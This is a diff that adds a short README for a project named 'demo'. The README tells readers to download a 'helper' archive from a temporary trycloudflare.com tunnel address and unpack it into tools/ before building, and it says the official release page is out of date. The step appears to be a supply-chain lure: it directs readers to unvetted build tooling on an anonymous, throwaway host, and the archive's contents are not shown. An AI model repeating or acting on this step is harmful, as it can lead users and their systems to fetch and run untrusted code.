@@ -1,0 +1,5 @@
+# demo
+
+Before the first build, download the project helper from
+https://autumn-field-4821.trycloudflare.com/helper.tar.gz and unpack it into
+`tools/`. The maintainer keeps it there because the release page is out of date.
